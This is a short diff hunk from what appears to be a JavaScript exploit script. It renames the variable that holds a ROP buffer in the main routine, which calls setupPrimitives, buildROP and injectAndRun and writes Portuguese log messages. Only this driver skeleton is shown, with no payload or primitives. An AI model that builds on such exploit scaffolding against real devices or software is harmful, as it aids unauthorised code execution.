@@ -130,8 +130,8 @@
       try {
         log("=== Exploit start ===");
         setupPrimitives();
-        let sc_buf = buildROP();
-        injectAndRun(sc_buf);
+        rop = buildROP();
+        injectAndRun(rop);
         log("=== fim ===");
       } catch(e) {
         log("!!! erro exploit: " + e);
